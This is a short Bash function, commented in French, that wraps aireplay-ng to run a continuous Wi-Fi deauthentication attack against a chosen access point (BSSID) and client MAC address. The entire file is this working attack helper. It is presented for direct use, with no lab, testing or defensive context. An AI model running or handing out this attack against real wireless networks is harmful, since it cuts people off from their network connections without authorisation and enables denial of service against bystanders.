# DESC: Lance une attaque de désauthentification sur un réseau Wi-Fi cible
# USAGE: deauth_attack <interface> <cible_mac> <bssid>
deauth_attack() {
    local interface="$1"
    local target_mac="$2"
    local bssid="$3"
    sudo aireplay-ng --deauth 0 -a "$bssid" -c "$target_mac" "$interface"
}
